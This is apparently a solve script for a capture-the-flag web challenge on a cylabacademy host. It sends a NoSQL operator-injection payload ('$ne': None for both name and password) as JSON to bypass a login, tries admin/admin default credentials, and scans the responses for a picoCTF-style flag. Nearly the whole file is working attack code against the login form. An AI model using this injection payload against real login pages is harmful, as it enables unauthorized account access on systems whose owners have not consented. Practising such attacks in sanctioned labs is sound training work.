import sys, requests, urllib3, re, json
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
r = requests.get(BASE, timeout=20)
print("headers:", dict(r.headers))
tests = []
tests.append(("json ct", {"data": json.dumps({"name": {"$ne": None}, "pass": {"$ne": None}}),
                           "headers": {"Content-Type": "application/json"}}))
tests.append(("json ct str", {"data": json.dumps({"name": "admin", "pass": "admin"}),
                              "headers": {"Content-Type": "application/json"}}))
tests.append(("form plain", {"data": {"name": "admin", "pass": "admin"}}))
for label, kw in tests:
    try:
        r = requests.post(BASE, timeout=20, **kw)
        al = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,100})", r.text)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        print("%-14s -> %d | %r %s" % (label, len(r.text), (al[0].strip()[:60] if al else "-"),
                                       "FLAG " + m.group(0) if m else ""))
    except Exception as e:
        print(label, "ERR", type(e).__name__)
